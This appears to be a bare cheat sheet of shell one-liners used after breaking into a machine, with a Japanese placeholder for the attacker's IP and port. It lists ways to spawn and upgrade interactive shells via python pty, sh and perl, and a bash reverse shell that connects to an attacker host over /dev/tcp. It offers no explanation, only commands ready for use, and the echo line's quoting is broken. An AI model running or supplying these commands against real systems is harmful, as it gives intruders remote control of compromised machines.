```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
echo 'os.system('/bin/bash')'
```

```bash
/bin/sh -i
```

```bash
bash -i >& /dev/tcp/<攻撃者IP>/<ポート番号> 0>&1
```

```bash
perl -e 'exec "/bin/sh";'
```